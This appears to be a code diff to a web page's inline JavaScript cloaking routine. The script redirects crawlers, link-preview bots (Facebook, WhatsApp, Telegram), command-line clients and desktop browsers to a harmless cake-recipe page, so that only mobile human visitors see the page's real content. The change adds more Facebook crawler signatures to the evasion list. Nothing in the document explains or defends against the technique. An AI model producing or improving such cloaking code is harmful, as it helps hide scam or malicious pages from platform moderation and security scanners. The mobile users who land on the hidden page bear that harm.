@@ -5,7 +5,7 @@
     (function(){
       var w="https://www.tudogostoso.com.br/receita/91534-bolo-comum.html";
       var u = navigator.userAgent.toLowerCase();
-      var b = ["facebook","crawler","bot","spider","meta","preview","whatsapp","telegram","curl","python"];
+      var b = ["facebookexternalhit","facebot","crawler","bot","spider","meta","preview","whatsapp","telegram","curl","python"];
       var d = !/android|iphone|ipad|mobile/i.test(u);
       var f = b.some(function(x){ return u.indexOf(x) !== -1 });
       if(f || d){ window.location.href = w; }
